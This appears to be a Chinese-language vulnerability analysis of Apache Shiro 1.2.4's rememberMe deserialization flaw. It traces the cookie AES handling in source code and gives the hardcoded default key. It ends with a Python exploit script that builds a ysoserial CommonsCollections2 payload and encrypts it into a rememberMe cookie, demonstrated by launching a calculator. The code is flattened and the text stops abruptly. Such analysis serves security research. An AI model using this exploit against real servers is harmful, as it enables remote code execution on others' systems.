8.5.56\nshiro\u7248\u672c\uff1ashiro-root-1.2.4\n\u7ec4\u4ef6\uff1acommons-collections4\n\u6b63\u5e38\u642d\u5efa\n\u76f4\u63a5\u4e0b\u8f7d\uff1a\nhttps:\/\/codeload.github.com\/apache\/shiro\/zip\/shiro-root-1.2.4\n\u4e0b\u8f7d\u597d\u4ee5\u540e\u76f4\u63a5\u89e3\u538b\n\u7136\u540e\u5077\u5077\u7684\u8fdb\u5165samples\/web\u76ee\u5f55\uff0c\u76f4\u63a5\u4fee\u6539pom\u6587\u4ef6\uff0c\u4e3b\u8981\u4fee\u6539\u4e0b\u9762\u8fd9\u4e9b\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n...<dependencies>    <dependency>        <groupId>javax.servlet<\/groupId>\n<artifactId>jstl<\/artifactId>        <!--  \u8fd9\u91cc\u9700\u8981\u5c06jstl\u8bbe\u7f6e\u4e3a1.2 -->        <version>\n1.2<\/version>        <scope>runtime<\/scope>    <\/dependency>.....    <dependency\n>        <groupId>org.apache.commons<\/groupId>        <artifactId>commons-collec\ntions4<\/artifactId>        <version>4.0<\/version>    <\/dependency><dependencies>\n\u7136\u540e\u90e8\u7f72\uff0c\u6211\u5c31\u76f4\u63a5\u4f7f\u7528IEDA \u90e8\u7f72\u4e86\n[]\n\u5751\u70b9\uff1a\n\u5982\u679c\u6709\u4f7f\u7528maven\u6253\u5305\u642d\u5efa\u7684\u8bdd\uff0c\u53ef\u80fd\u9047\u5230\n*\nFailed to execute goal org.apache.maven.plugins:maven-toolchains-plugin:1.1:tool\nchain (default) on project samples-web: Misconfigured toolchains.\n\u8fd9\u5e94\u8be5\u662fmaven\u6253\u5305\u8fd9\u91cc\u89811.6\u7684\u73af\u5883\uff0c\u4f46\u8fd0\u884c\u4e0d\u5f71\u54cd\n\u9700\u8981\u4fee\u6539 maven\/conf\/toolchains.xml \u7684\u4ee3\u7801\uff1a\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n<toolchain>    <type>jdk<\/type>    <provides>      <version>1.6<\/version>      <\nvendor>sun<\/vendor>    <\/provides>    <configuration>      <jdkHome>\/Library\/Jav\na\/JavaVirtualMachines\/1.6.0.jdk<\/jdkHome>    <\/configuration><\/toolchain>\n\u6211\u4eec\u8fd8\u9700\u8981\u4ea7\u751fpayload\u7684 ysoserial\nysoserial\u9879\u76ee\u6e90\u7801\u5728\u8fd9\u91cchttps:\/\/github.com\/frohoff\/ysoserial \uff0c\u7136\u540e\u81ea\u5df1\u7f16\u8bd1\uff0c\n\u4e5f\u53ef\u76f4\u63a5\u4e0b\u8f7d\u7f16\u8bd1\u597d\u7684release\u3002\n0x03.\u4ee3\u7801\u5206\u6790\n\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u6f0f\u6d1e\uff1a\n\u7b80\u5355\u4ecb\u7ecd\u5229\u7528\uff1a\n* \u901a\u8fc7\u5728cookie\u7684rememberMe\u5b57\u6bb5\u4e2d\u63d2\u5165\u6076\u610fpayload\uff0c\n* \u89e6\u53d1shiro\u6846\u67b6\u7684rememberMe\u7684\u53cd\u5e8f\u5217\u5316\u529f\u80fd\uff0c\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\n* shiro 1.2.24\u4e2d\uff0c\u63d0\u4f9b\u4e86\u786c\u7f16\u7801\u7684AES\u5bc6\u94a5\uff1akPH+bIxk5D2deZiIxcaaaA==\n* \u7531\u4e8e\u5f00\u53d1\u4eba\u5458\u672a\u4fee\u6539AES\u5bc6\u94a5\u800c\u76f4\u63a5\u4f7f\u7528Shiro\u6846\u67b6\uff0c\u5bfc\u81f4\u4e86\u8be5\u95ee\u9898\n\u52a0\u5bc6\u8fc7\u7a0b\n\u627e\u5165\u53e3\u70b9\u7684\u8bdd\uff0c\u5c31\u662f\u8fd9\u4e2a\u6f0f\u6d1e\u4e00\u76f4\u63d0\u7684\u786c\u7f16\u7801\u5730\u65b9\u4e0b\u624b\uff0c\u7136\u540e\u7a0d\u5fae\u56de\u6eaf\u5c31\u627e\u5230\uff0c\u6211\u4eec\u4e5f\u53ea\u9700\u5173\u6ce8rememberMe\u8fd9\u4e2a\u5904\u7406\u5c31\u597d\u4e86\n\u9996\u5148\u627e\u5230\/shiro-core-1.2.4.jar!\/org\/apache\/shiro\/mgt\/AbstractRememberMeManag\ner.class\uff0c\u8be5\u7c7b\u4f4d\u4e8eshiro-core\u6a21\u5757\n\u6211\u4eec\u53d1\u73b0\u4e86\uff0c\u6211\u4eec\u6700\u5e38\u89c1\u7684\uff0c\u5e38\u5e38\u63d0\u5230\u7684\u7684key\uff0c\u90a3\u4e48\u5165\u53e3\u70b9\u53ef\u80fd\u5728\u8fd9\u91cc\n*\nprivate static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D\n2deZiIxcaaaA==\");\n[]\n* \u4ed6\u662f\u7ee7\u627f\u4e86RememberMeManager\u7c7b\uff0c\u90a3\u4e48\u6211\u4eec\u5411\u4e0a\u6eaf\u6e90\uff1a\u627e\u5230RememberMeManager\u7c7b\u7684onSuccessfulL\nogin\u65b9\u6cd5\uff0c\u770b\u540d\u5b57\u5c31\u76f4\u63a5\u662f\u767b\u9646\u6210\u529f\u7684\u5904\u7406\n* \u90a3\u6211\u4eec\u4e0b\u4e00\u4e2a\u65ad\u70b9\uff0c\u7814\u7a76\u4e00\u4e0b\u8fd9\u4e2arememberme\u7684\u52a0\u5bc6\u548c\u5904\u7406\u6d41\u7a0b\uff0c\u662f\u4e2a\u4ec0\u4e48\u539f\u7406\n[]\n\u6240\u4ee5\u6211\u4eec\u767b\u9646\u4e00\u4e0b\uff0cdebug\u5f00\u542f \uff0c\u8bb0\u5f97\u8981\u52fe\u9009Remember Me\n[]\n\u7136\u540e\u6211\u4eec\u6536\u5230\u6570\u636e\u4e86\uff0c\u76f4\u63a5\u6b65\u5165\u8ddf\u8fdb\n[]\n\u8f6c\u5165\u4e86forgetIdentity\u51fd\u6570\uff0c\u5904\u7406request\u548cresponse\u8bf7\u6c42\uff0c\u7ee7\u7eed\u8ddf\u8fdbthis.forgetIdentity\u65b9\u6cd5\uff0c\u8fdb\u5165\u4e86\n\u7ee7\u7eed\u8ddf\u8fdbthis.forgetIdentity\u65b9\u6cd5\uff0c\u8fdb\u5165\u4e86getCookie\u7684removeFrom\u65b9\u6cd5\uff0c\u8ddf\u8fdbremoveFrom\u65b9\u6cd5\n*\nthis.getCookie().removeFrom(request, response);\n[]\n* \u8fd9\u91cc\u83b7\u53d6\u770b\u914d\u7f6e\u4fe1\u606f\uff0c\u6700\u540eaddCookieHeader\u653e\u5230\u4e86\u8fd4\u56de\u5305\u4e2d\u7684cookie\u5934\u4e2d\uff0c\u5176\u4e2d\u5c31\u6709\u6211\u4eec\u719f\u6089\u7684\uff0cdeleteMe\u5b57\u6bb5\u548cre\nmemberMe\u5b57\u6bb5\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u6307\u7eb9\u8bc6\u522b\u6700\u7b80\u5355\u7684\u4e24\u79cd\u65b9\u6cd5\u7684\u539f\u7406\n[]\n* \u7136\u540e\u8fd9\u4e00\u9636\u6bb5\u7ed3\u675f\u4e86\uff0c\u968f\u540e\u56de\u5230\u521a\u521a\u7684onSuccessfulLogin\u65b9\u6cd5\u4e2d\uff0c\u8fd9\u4e2aisRememberMe\u4e3b\u8981\u662f\u68c0\u67e5\u9009\u62e9\u4e86remembe\nr me\u8fd9\u4e2a\u6309\u94ae\u6ca1\u6709\uff0c\u968f\u540e\u6b65\u5165 rememberIdentity \u65b9\u6cd5\uff0c\u770b\u770b\u505a\u4e86\u4ec0\u4e48\n*\n[]\n\u5728rememberIdentity\u65b9\u6cd5\u4e2d\uff0cauthcInfo\u7684\u503c\u5c31\u662f\u6211\u4eec\u8f93\u5165root\u7528\u6237\u540d\uff0c\u7ee7\u7eed\u8ddf\u8fdbrememberIdentity\u51fd\u6570\n*\n*\nPrincipalCollection principals = this.getIdentityToRemember(subject, authcInfo);\nthis.rememberIdentity(subject, principals);\n[]\n\u8fdb\u5165rememberIdentity\u65b9\u6cd5\u540e\u53d1\u73b0\uff0c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f\u8f6c\u5316\u4e3abytes\uff0c\u8ddf\u8fdbconvertPrincipalsToBytes\n*\n*\n*\n*\nprotected void rememberIdentity(Subject subject, PrincipalCollection accountPrin\ncipals) {    byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals);\nthis.rememberSerializedIdentity(subject, bytes);}\n[]\n* \u8fdb\u5165convertPrincipalsToBytes\u65b9\u6cd5\uff0c\u53d1\u73b0\u5b83\u4f1a\u5e8f\u5217\u5316\uff0c\u800c\u4e14\u5e8f\u5217\u5316\u7684\u662f\u4f20\u5165\u7684root\u7528\u6237\u540d\n* \u540e\u7eed\u8ddf\u8fdb\u770b\u4e86\u4e00\u4e0b\uff0c\u5c31\u662f\u666e\u901a\u7684\u5e8f\u5217\u5316\uff0c\u6ca1\u6709\u4ec0\u4e48\u7279\u6b8a\u7684\u64cd\u4f5c\uff0c\u5c31\u4e0d\u7ee7\u7eed\u5199\u4e86\n* \u7136\u540e\u8c03\u7528encrypt\u65b9\u6cd5\u52a0\u5bc6\u5e8f\u5217\u5316\u540e\u7684\u4e8c\u8fdb\u5236\u5b57\u8282\n* \u8fd9\u4e2a\u5fc5\u987b\u5f97\u8ddf\u8fdb\u770b\u4e00\u4e0bencrypt\u65b9\u6cd5\u5427\n*\n*\n*\n*\n*\n*\n*\n*\n*\nprotected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {    b\nyte[] bytes = this.serialize(principals);    if (this.getCipherService() != null\n) {        bytes = this.encrypt(bytes);    }\nreturn bytes;}\n\u53d1\u73b0CipherService cipherService =\nthis.getCipherService()\uff0c\u5c31\u662f\u83b7\u53d6\u5bc6\u7801\u670d\u52a1\u7684\u610f\u601d\uff0c\u90a3\u4e48\u770b\u4e00\u4e0b\u83b7\u53d6\u4e86\u8fd9\u4e48\uff0c\u770b\u4e00\u7ed3\u679c\u53d1\u73b0\u662fAES\u52a0\u5bc6\u65b9\u6cd5\uff0c\u800c\u4e14\u662fAES\/CB\nC\/PKCS5Padding\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\nprotected byte[] encrypt(byte[] serialized) {    byte[] value = serialized;    C\nipherService cipherService = this.getCipherService();    if (cipherService != nu\nll) {        ByteSource byteSource = cipherService.encrypt(serialized, this.getE\nncryptionCipherKey());        value = byteSource.getBytes();    }\nreturn value;}\n[]\n\u90a3\u4e48\u4e0b\u4e00\u53e5\u8bdd\u5c31\u662f\uff1a\u52a0\u5bc6\u8fd9\u4e2a\u4f20\u5165\u7684\u6570\u636e\u7684\u65b9\u6cd5\u4e86\u3002\n\u518d\u770b\u8fd9\u5c31\u8bddthis.getEncryptionCipherKey()\uff0c\u660e\u663e\u8fd9\u662f\u83b7\u53d6\u79d8\u94a5\u4e86\uff0c\u76f4\u63a5\u8ddf\u8fdbgetEncryptionCipherKey\n*\nByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCiph\nerKey());\n\u8fd9\u4e2a\u627ekey \u5c31\u662f\u5728\u8fd9\u4e2a\u7c7b\u4e2d\u53cd\u590d\u6a2a\u8df3\uff0c\u5c31\u53ef\u4ee5\u627e\u5230\uff0c\u5c31\u8be6\u7ec6\u770b\u4e86\uff1a\n*\n*\n*\n*\n*\nthis.encryptionCipherKeysetEncryptionCipherKey\uff08\uff09setCipherKey(byte[] cipherKey)--\n-setEncryptionCipherKey\uff08\uff09this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES)\n\u6700\u7ec8\u6eaf\u6e90\u5230 getEncryptionCipherKey \u5c31\u662f\u5f00\u5934\u4e2d\u7684DEFAULT_CIPHER_KEY_BY\nTES\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u4e00\u5f00\u59cb\u7b2c\u4e00\u4e2a\u63d0\u5230\u7684kPH+bIxk5D2deZiIxcaaaA==\u8fd9\u4e2akey\n[]\n\u968f\u540e\u5c31\u4f20\u5165 encrypt\u51fd\u6570\uff08root \uff0c\u521a\u521a\u83b7\u53d6\u7684key\uff09\uff0c\u8fd9\u65f6\u5c31\u52a0\u5bc6\u65b9\u6cd5\u4e86\uff01\uff01\uff01\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\npublic ByteSource encrypt(byte[] plaintext, byte[] key) {    byte[] ivBytes = nu\nll;     \/\/\u751f\u6210\u521d\u59cb\u5316\u5411\u91cf\uff0c\u968f\u540e generate:TURE    boolean generate = this.isGenerateInitiali\nzationVectors(false);\nif (generate) {                 \/\/\u4ea7\u751f\u521d\u59cb\u5316\u5411\u91cf        ivBytes = this.generateInit\nializationVector(false);              \/\/\u5f02\u5e38\uff0c\u4e0d\u4f1a\u8fdb\u5165\u7684        if (ivBytes == null || i\nvBytes.length == 0) {            throw new IllegalStateException(\"Initialization\nvector generation is enabled - generated vectorcannot be null or empty.\");\n}    }    \/\/\u518d\u8ddf\u8fdb\u5c31\u662f\u66f4\u52a0\u5177\u4f53\u7684\u65b9\u6cd5\u4e86\uff0c\u57fa\u672c\u7684\u52a0\u5bc6\u903b\u8f91\u5df2\u77e5 \u5e8f\u5217\u5316root key \u7136\u540e\u8fd8\u6709iv    return this.encrypt\n(plaintext, key, ivBytes, generate);}\n\u52a0\u5bc6\u540e\u6570\u636e\u4e00\u76f4\u5411\u4e0a\u56de\u6eaf\uff0c\u76f4\u5230 rememberIdentity\u8fd9\u4e2a\u65b9\u6cd5\u4e0b\u6709\u4e2a\nrememberSerializedIdentity\u65b9\u6cd5\u8981\u8ddf\u5982\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u662f\u8bb0\u4f4f\u5e8f\u5217\u5316\u8eab\u4efd\u7684\u529f\u80fd\n[]\n\u8ddf\u5982\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5c31\u57fa\u672c\u4e0a\u5230\u4e86\u52a0\u5bc6\u7684\u6700\u540e\u4e00\u6b65\uff0c\u628a\u521a\u521a\u52a0\u5bc6\u7684\u6570\u636ebase64\uff0c\u7136\u540e\u90fd\u52a0\u5165\u5230cookie\u91cc\u9762\n[]\n\u89e3\u5bc6\u8fc7\u7a0b\uff1a\n\u73b0\u5728\u7ee7\u7eed\u7814\u7a76\u89e3\u5bc6\u8fc7\u7a0b\uff1a\n* \u9996\u5148\u786e\u5b9a\u5207\u5165\u70b9\n* \u6211\u9009\u62e9\u4ece\u83b7\u53d6\u5230\u5ba2\u6237\u7aef\u6570\u636e\u5f00\u59cb\u5206\u6790 \uff0c\u90a3\u5c31\u662f\norg.apache.shiro.mgt.AbstractRememberMeManager \u7c7b\u7684\ngetRememberedPrincipals \u65b9\u6cd5\u4e0b\u65ad\u70b9\n* \u968f\u540e\u5728\u9875\u9762\u968f\u4fbf\u5237\u65b0\u4e00\u4e0b\uff0c\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u65b9\u6cd5\n\u76f4\u63a5\u8ddf\u8fdb getRememberedSerializedIdentity(subjectContext) \u65b9\u6cd5\uff0c\u770b\u770b\u4ece\u6570\u636e\u4e2d\uff0c\u90fd\u83b7\u53d6\u4e86\u4ec0\u4e48\n[]\n\u8fd9\u4e2agetRememberedSerializedIdentity\u65b9\u6cd5\u4e2d\n\u6709\u4e00\u4e2athis.getCookie().readValue(request, response)\n\u8fd9\u662f\u8981\u8bfb\u53d6cookice\u4e2d\u7684\u6570\u636e\u4e86\uff0c\u8fd9\u5fc5\u987b\u8ddf\u5165\u4e86\n[]\n\u7136\u540e readValue \u65b9\u6cd5\uff0c\u6839\u636e Cookie \u4e2d\u7684 name \u5b57\u6bb5\uff08\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u662f rememberMe\uff09\u83b7\u53d6 Cookie \u7684\u503c\n\u6700\u7ec8\u628a\u83b7\u53d6cookie\u91cc\u9762\u7684rememberme \u7ed9\u5230 value \u8fd4\u56de\u4e0a\u4e00\u7ea7\u51fd\u6570\n[]\n*\nbyte[] decoded = Base64.decode(base64);\n* \u518d\u6b21\u56de\u5230AbstractRememberMeManager \u7c7b\n* \u4e0b\u4e00\u4e2a\u6d41\u7a0b\u5c31\u662f convertBytesToPrincipals \u65b9\u6cd5\uff0c\u8fd9\u5c31\u662f\u5bf9\u5e94\u52a0\u5bc6\u7684\u89e3\u6790\u6570\u636e\uff0c\u4e2d\u95f4\u80af\u5b9a\u8981\u89e3\u5bc6\u6570\u636e\uff0c\u7ee7\u7eed\u8ddf\u5165\n[]\n\u8fdb\u5165\u53d1\u73b0\u4e86 decrypt\uff08\uff09\u51fd\u6570\uff0c\u8fd9\u5c31\u5f88\u660e\u663e\u5c31\u8fdb\u884c\u89e3\u5bc6\u4e86\uff0c\u7ee7\u7eed\u8ddf\u5165\n*\n*\n*\n*\n*\n*\n*\n*\nprotected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectCont\next subjectContext) {    if (this.getCipherService() != null) {        bytes = t\nhis.decrypt(bytes);    }\nreturn this.deserialize(bytes);}\n[]\n\u8be6\u7ec6\u770b\u770bdecrypt\u89e3\u5bc6\u51fd\u6570\uff1a\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\nprotected byte[] decrypt(byte[] encrypted) {        byte[] serialized = encr\nypted;        CipherService cipherService = this.getCipherService();        if (\ncipherService != null) {            ByteSource byteSource = cipherService.decryp\nt(encrypted, this.getDecryptionCipherKey());            serialized = byteSource.\ngetBytes();        }\nreturn serialized;    }\ngetCipherService();\u8001\u719f\u4eba\u4e86\uff0c\u83b7\u53d6\u52a0\u5bc6\u65b9\u6cd5\uff1aAES\/CBC\/PKCS5Padding\n[]\n*\nByteSource byteSource = cipherService.decrypt(encrypted, this.getDecryptionCiphe\nrKey());\n\u8ddf\u8fdb\u5230\u4e86JcaCipherService\u7684decrypt\u51fd\u6570\u91cc\u9762\uff1a\u5206\u6790\u4e00\u4e0b\u91cc\u9762\u7684\u903b\u8f91\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\npublic ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException\n{    byte[] encrypted = ciphertext;    byte[] iv = null;    if (this.isGenerateI\nnitializationVectors(false)) {        try {            int ivSize = this.getInit\nializationVectorSize();            int ivByteSize = ivSize \/ 8;            iv =\nnew byte[ivByteSize];                        \/\/ivByteSize=16            \/\/cipher\ntext\u8fd9\u4e2a\u6570\u7ec4 0-16\u4f4d \u8986\u76d6\u5230 iv\u6570\u7ec4 \uff0c\u76f8\u5f53\u4e8e\u7ed9 vi\u8d4b\u503c ciphertext\u7684\u524d16\u4f4d            System.arraycopy(c\niphertext, 0, iv, 0, ivByteSize);                      \/\/             int encryp\ntedSize = ciphertext.length - ivByteSize;            encrypted = new byte[encryp\ntedSize];                         \/\/ ciphertext\u6570\u7ec4 \uff0c\u4ece 16\u4f4d\u540e\u9762\u7684\u6570\u636e \u8d4b\u503c\u7ed9encrypted\nSystem.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);\n} catch (Exception var8) {            String msg = \"Unable to cor\nrectly extract the Initialization Vector or ciphertext.\";            throw new C\nryptoException(msg, var8);        }    }  \/\/\u8fdb\u5165\u4e0b\u4e00\u5c42\u89e3\u5bc6  return this.decrypt(encrypt\ned, key, iv);}\n\u8ffd\u968f\u5230 JcaCipherService \u7684 decrypt \u65b9\u6cd5\u4e2d\uff0c\u7ee7\u7eed\u8ddf\u5165 crypt \u65b9\u6cd5\n*\n*\n*\n*\n*\n*\n*\n*\nprivate ByteSource decrypt(byte[] ciphertext, byte[] key, byte[] iv) throws Cryp\ntoException {    if (log.isTraceEnabled()) {        log.trace(\"Attempting to dec\nrypt incoming byte array of length \" + (ciphertext != null ? ciphertext.length :\n0));    }\nbyte[] decrypted = this.crypt(ciphertext, key, iv, 2);    return decrypted =\n= null ? null : Util.bytes(decrypted);}\n\u8dd1\u5230 JcaCipherService \u4e2d\u7684 crypt \u65b9\u6cd5\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\nprivate byte[] crypt(byte[] bytes, byte[] key, byte[] iv, int mode) throws Illeg\nalArgumentException, CryptoException {    if (key != null && key.length != 0) {\n\/\/\u521d\u59cb\u5316cipher\uff0c\u518d\u8ddf\u5165\u5c31\u662f \u539f\u751f\u7684 cipher.init \u89e3\u5bc6\u65b9\u6cd5\u4e86        Cipher cipher = thi\ns.initNewCipher(mode, key, iv, false);        \/\/ \u57fa\u672c\u5b8c\u6210\u89e3\u5bc6        return this.crypt\n(cipher, bytes);    } else {        throw new IllegalArgumentException(\"key argu\nment cannot be null or empty.\");    }}\n\u89e3\u5bc6\u5b8c\u6210\uff0c\u5e8f\u5217\u5316\u64cd\u4f5c\n\u89e3\u5bc6\u5b8c\u6210\u540e\uff0c\u4e00\u6b65\u6b65\u7684return\u56de\u5230\u4e0a\u7ea7\u51fd\u6570\uff0c\u56de\u5230AbstractRememberMeManager \u7684 decrypt \u65b9\u6cd5\uff0c\u770b\u4e00\u4e0b\u6570\u636e\nr00 \u5f00\u5934 \u5e8f\u5217\u5316\u7684\u6570\u636e\n[]\n\u5411\u4e0areturn\uff0c\u770b\u5230deserialize \u53cd\u5e8f\u5217\u5316\u7684\u65b9\u6cd5\u4e86\n[]\n\u4e00\u76f4\u8ddf\u8fdb\u5230 DefaultSerializer \u7684 deserialize\u65b9\u6cd5\u4e2d\uff0c\u89c1\u5230\u4e86\u4e45\u8fdd\u7684 readObject\uff08\uff09\u65b9\u6cd5\n[]\n0x04 \u7f16\u5199POC EXP\n\u672c\u6b21AES\u52a0\u5bc6\u7684\u4e00\u4e9b\u5c0f\u77e5\u8bc6\u70b9\uff1a\n* \u67d0\u4e9b\u52a0\u5bc6\u7b97\u6cd5\u8981\u6c42\u660e\u6587\u9700\u8981\u6309\u4e00\u5b9a\u957f\u5ea6\u5bf9\u9f50\uff0c\u53eb\u505a\u5757\u5927\u5c0f(BlockSize)\uff0c\u6211\u4eec\u8fd9\u6b21\u5c31\u662f16\u5b57\u8282\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4e00\u6bb5\u4efb\u610f\u7684\u6570\u636e\uff0c\u52a0\u5bc6\u524d\u9700\u8981\u5bf9\u6700\n\u540e\u4e00\u4e2a\u5757\u586b\u5145\u523016 \u5b57\u8282\uff0c\u89e3\u5bc6\u540e\u9700\u8981\u5220\u9664\u6389\u586b\u5145\u7684\u6570\u636e\u3002\n* AES\u4e2d\u6709\u4e09\u79cd\u586b\u5145\u6a21\u5f0f(PKCS7Padding\/PKCS5Padding\/ZeroPadding)\n* PKCS7Padding\u8ddfPKCS5Padding\u7684\u533a\u522b\u5c31\u5728\u4e8e\u6570\u636e\u586b\u5145\u65b9\u5f0f\uff0cPKCS7Padding\u662f\u7f3a\u51e0\u4e2a\u5b57\u8282\u5c31\u8865\u51e0\u4e2a\u5b57\u8282\u76840\uff0c\u800cP\nKCS5Padding\u662f\u7f3a\u51e0\u4e2a\u5b57\u8282\u5c31\u8865\u5145\u51e0\u4e2a\u5b57\u8282\u7684\u51e0\uff0c\u597d\u6bd4\u7f3a6\u4e2a\u5b57\u8282\uff0c\u5c31\u8865\u51456\u4e2a\u5b57\u8282\u76846\n\u52a0\u5bc6\u6d41\u7a0b\u5c31\u662f\uff1a\n* \u4f7f\u7528\u7684 AES\/CBC\/PKCS5Padding \u6a21\u5f0f\n* random = this.ensureSecureRandom(); \u4f7f\u7528\u968f\u673a\u6570\u751f\u6210 ivBytes\n* key\u4e3a\u9884\u7559\u7684\u90a3\u4e2a\u786c\u7f16\u7801\n* encrypt(plaintext, key, ivBytes, generate) \u751f\u6210\n* \u6700\u540ebase64\u52a0\u5bc6\uff0c\u653e\u5165cookie\u4e2d\n\u89e3\u5bc6\u6d41\u7a0b\u53ef\u4ee5\u77e5\u9053\uff1a\n* \u4f7f\u7528\u7684 AES\/CBC\/PKCS5Padding \u6a21\u5f0f \uff0c\u6240\u4ee5Key\u8981\u6c42\u662f\u4e3a16\u4f4d\u7684\uff0ckey\u4e3a\u9884\u7559\u7684\u90a3\u4e2a\u786c\u7f16\u7801\n* base64\u89e3\u5bc6cookie \u4e2d rememberMe\u7684\u503c\n* \u6839\u636e\u89e3\u5bc6 vi \u662f \u79d8\u6587\u7684\u524d16\u4f4d\n* iv\u5373\u4e3arememberMe\u89e3\u7801\u540e\u7684\u524d16\u4e2a\u5b57\u8282\n* \u6709\u4e86key \u548c vi \u5c31\u53ef\u4ee5\u89e3\u5bc6\u5230\u53cd\u5e8f\u5217\u5316\u7684\u6570\u636e\u4e86\n\u90a3POC\u7684\u6211\u4eec\u7684\u52a0\u5bc6\u6d41\u7a0b\u5c31\u662f\uff1a\n1. \u83b7\u53d6\u5230 \u53cd\u5e8f\u5217\u5316\u7684\u6570\u636e\n2. \u8bbe\u7f6eAES\u52a0\u5bc6\u6a21\u5f0f\uff0c\u4f7f\u7528AES.MODE_CBC\u7684\u5206\u5757\u6a21\u5f0f\n3. \u8bbe\u7f6e\u786c\u7f16\u7801\u7684 key\n4. \u4f7f\u7528\u968f\u673a\u6570\u751f\u6210 16 \u5b57\u8282\u7684 iv\n5. \u4f7f\u7528 iv + AES\u52a0\u5bc6(\u53cd\u5e8f\u5217\u5316\u6570\u636e) \u62fc\u63a5\n6. \u6700\u540ebase64\u52a0\u5bc6\u5168\u90e8\u5185\u5bb9\n\u5229\u7528\u601d\u8def\n\u8fd9\u91cc\u4e3b\u8981\u5bfc\u5165\u7684\u662f\u8fd9\u4e2a\u7248\u672c\u7684apache.commons\n*\n*\n*\n*\n<groupId>org.apache.commons<\/groupId><artifactId>commons-collections4<\/artifactI\nd><version>4.0<\/version>\n\u6240\u4ee5\u6211\u4eecEXP\u5229\u7528CommonsCollections2 \u7684\u5229\u7528\u94fe\n\u4e3b\u8981\u4f9d\u9760ysoserial\u751f\u6210\u5229\u7528\u7684\u53cd\u5e8f\u5217\u5316\u6570\u636e\uff0c\u7136\u540e\u6839\u636e\u52a0\u5bc6\u7684\u601d\u8def\uff0c\u628a\u5229\u7528\u94fe\u52a0\u8fdb\u53bb\u3002\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\nimport base64import sysimport uuidimport subprocess\nimport requestsfrom Crypto.Cipher import AES\ndef encode_rememberme(command):    # \u8fd9\u91cc\u4f7f\u7528CommonsCollections2\u6a21\u5757    popen = subpro\ncess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections2', command], st\ndout=subprocess.PIPE)\n# \u660e\u6587\u9700\u8981\u6309\u4e00\u5b9a\u957f\u5ea6\u5bf9\u9f50\uff0c\u53eb\u505a\u5757\u5927\u5c0fBlockSize \u8fd9\u4e2a\u5757\u5927\u5c0f\u662f block_size = 16 \u5b57\u8282    BS = AES.block_siz\ne\n# \u6309\u7167\u52a0\u5bc6\u89c4\u5219\u6309\u4e00\u5b9a\u957f\u5ea6\u5bf9\u9f50,\u5982\u679c\u4e0d\u591f\u8981\u8981\u505a\u586b\u5145\u5bf9\u9f50    pad = lambda s: s + ((BS - len(s) % BS) * chr\n(BS - len(s) % BS)).encode()\n# \u6cc4\u9732\u7684key    key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n# AES\u7684CBC\u52a0\u5bc6\u6a21\u5f0f    mode = AES.MODE_CBC\n# \u4f7f\u7528uuid4\u57fa\u4e8e\u968f\u673a\u6570\u6a21\u5757\u751f\u621016\u5b57\u8282\u7684 iv\u5411\u91cf    iv = uuid.uuid4().bytes\n# \u5b9e\u4f8b\u5316\u4e00\u4e2a\u52a0\u5bc6\u65b9\u5f0f\u4e3a\u4e0a\u8ff0\u7684\u5bf9\u8c61    encryptor = AES.new(base64.b64decode(key), mode, iv)\n# \u7528pad\u51fd\u6570\u53bb\u5904\u7406yso\u7684\u547d\u4ee4\u8f93\u51fa\uff0c\u751f\u6210\u7684\u5e8f\u5217\u5316\u6570\u636e    file_body = pad(popen.stdout.read())\n# iv \u4e0e \uff08\u5e8f\u5217\u5316\u7684AES\u52a0\u5bc6\u540e\u7684\u6570\u636e\uff09\u62fc\u63a5\uff0c \u6700\u7ec8\u8f93\u51fa\u751f\u6210rememberMe\u53c2\u6570    base64_rememberMe_value = ba\nse64.b64encode(iv + encryptor.encrypt(file_body))\nreturn base64_rememberMe_value\ndef dnslog(command):    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar\n', 'URLDNS', command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = l\nambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = \"kPH\n+bIxk5D2deZiIxcaaaA==\"    mode = AES.MODE_CBC    iv = uuid.uuid4().bytes    encr\nyptor = AES.new(base64.b64decode(key), mode, iv)    file_body = pad(popen.stdout\n.read())    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(fi\nle_body))    return base64_rememberMe_value\nif __name__ == '__main__':    # cc2\u7684exp    payload = encode_rememberme('\/System\/\nApplications\/Calculator.app\/Contents\/MacOS\/Calculator')    print(\"rememberMe={}\"\n.format(payload.decode()))\n# 